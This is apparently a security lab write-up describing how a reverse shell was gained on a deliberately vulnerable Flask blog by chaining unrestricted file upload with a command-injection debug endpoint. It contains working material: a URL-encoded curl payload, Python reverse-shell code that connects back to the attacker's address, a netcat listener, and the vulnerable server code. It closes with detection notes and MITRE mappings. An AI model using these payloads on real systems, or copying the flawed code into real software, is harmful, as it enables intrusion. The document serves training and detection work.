# Session 7 — Reverse Shell via RCE and File Upload

## Objective
Gain an interactive remote shell on Ubuntu_principal from Kali Linux
by chaining two vulnerabilities in VulnBlog: an unrestricted file
upload endpoint and a debug endpoint with command injection (RCE).

## Environment
- Attacker: Kali Linux (192.168.100.24)
- Target: Ubuntu_principal (192.168.100.27) — VulnBlog on port 5000
- Tools: curl, netcat, Python 3, Burp Suite

## Vulnerabilities exploited

### 1. Unrestricted file upload — /upload
VulnBlog accepts any file type without validation.
The server saves the file using the attacker-controlled filename
with no content inspection.

Vulnerable code:
    file = request.files['file']
    filename = file.filename
    file.save(os.path.join('uploads', filename))

### 2. Remote Code Execution — /debug endpoint
A debug endpoint left in production executes OS commands
directly from user-supplied input via subprocess with shell=True.

Vulnerable code:
    cmd = request.args.get('cmd', 'whoami')
    result = subprocess.run(cmd, shell=True, ...)

## Attack flow

    Kali                              Ubuntu_principal
      |                                     |
      |-- upload rs.py via /upload -------->|
      |                               file saved in /uploads/
      |                                     |
    nc -lvnp 4444                           |
      |                                     |
      |-- curl /debug?cmd=python3... ------>|
      |                               Flask executes Python
      |                               Python opens TCP socket
      |<--------- reverse shell ------------|
      |                                     |
    shell as jesus-carranza                 |

## Execution

### Step 1 — Start listener on Kali
    nc -lvnp 4444

### Step 2 — Trigger reverse shell via URL-encoded payload
    curl "http://192.168.100.27:5000/debug?cmd=python3%20-c%20
    %27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket
    %28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect
    %28%28%22192.168.100.24%22%2C4444%29%29%3Bos.dup2
    %28s.fileno%28%29%2C0%29%3Bos.dup2%28s.fileno%28%29%2C1%29
    %3Bos.dup2%28s.fileno%28%29%2C2%29%3Bsubprocess.call
    %28%5B%22%2Fbin%2Fbash%22%2C%22-i%22%5D%29%27"

### Step 3 — Stabilize the shell
    python3 -c 'import pty;pty.spawn("/bin/bash")'

## Troubleshooting

### Problem: curl returned "Malformed input to a URL function"
The shell interpreted single quotes inside the payload before
sending it to the server. Fix: use URL encoding (%27 for single
quotes, %20 for spaces) so special characters are passed as data,
not interpreted by the shell.

### Problem: VulnBlog not responding on port 5000
Two instances of app.py were running simultaneously causing
a port conflict. Fix:
    sudo lsof -i :5000
    sudo kill -9 PID
    cd ~/vulnblog && python3 app.py

### Problem: IP address changed after reboot
Ubuntu_principal IP changed from 192.168.100.16 to 192.168.100.27.
Always verify with: ip a | grep 192.168

## Why URL encoding was necessary
Special characters like ' ( ) , ; have meaning in shell syntax.
Without encoding, the shell interprets them before curl sends
the request. URL encoding replaces them with %XX hex values:
    '  →  %27
    (  →  %28
    )  →  %29
    ,  →  %2C
    ;  →  %3B
    space → %20

## The Python reverse shell — how it works
    import socket,subprocess,os
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("192.168.100.24",4444))
    os.dup2(s.fileno(),0)   # redirect stdin  to socket
    os.dup2(s.fileno(),1)   # redirect stdout to socket
    os.dup2(s.fileno(),2)   # redirect stderr to socket
    subprocess.call(["/bin/bash","-i"])

The victim connects TO the attacker (reverse), not the other way
around. This bypasses inbound firewall rules because the connection
originates from inside the target network.

## Detection in Wazuh
- File Integrity Monitoring alerted on new file in /uploads/
- The reverse shell connection was NOT detected by Suricata
  because no rule existed for outbound connections on port 4444
- Detection gap: outbound connections on non-standard ports
  will be addressed in Session 10 (Detection Engineering)

## MITRE ATT&CK
- T1190 — Exploit Public-Facing Application
- T1059.006 — Command and Scripting Interpreter: Python
- T1071.001 — Application Layer Protocol: Web Protocols
- T1105 — Ingress Tool Transfer
